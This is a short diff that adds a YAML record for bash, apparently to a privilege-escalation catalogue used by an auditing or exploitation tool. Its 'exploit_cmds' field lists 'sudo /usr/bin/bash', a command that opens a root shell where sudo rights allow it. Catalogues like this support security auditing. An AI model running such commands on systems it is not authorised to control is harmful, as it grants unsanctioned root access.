@@ -1,0 +1,4 @@
+name: bash
+binary_path: /usr/bin/bash
+exploit_cmds:
+- sudo /usr/bin/bash
